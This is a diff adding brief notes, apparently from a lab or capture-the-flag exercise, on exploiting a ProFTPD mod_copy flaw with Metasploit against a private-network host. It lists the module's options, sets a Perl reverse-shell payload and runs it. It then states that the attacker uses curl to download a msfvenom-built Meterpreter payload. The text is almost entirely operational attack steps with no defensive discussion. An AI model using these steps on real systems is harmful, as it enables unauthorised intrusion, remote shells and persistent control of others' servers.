@@ -1,0 +1,20 @@
+metasploit:
+use unix/ftp/proftpd_modcopy_exec
+Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     172.17.0.12      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       HTTP port (TCP)
+   RPORT_FTP  21               yes       FTP port
+   SITEPATH   /var/www/html    yes       Absolute writable website path
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to the website
+   TMPPATH    /tmp             yes       Absolute writable path
+   VHOST                       no        HTTP server virtual host
+
+show payloads
+set payload cmd/unix/reverse_perl
+run
+
+
+after running you get a cmd.
+then the attacker needs to find curl and use it to download a venum created meterpreter.
+
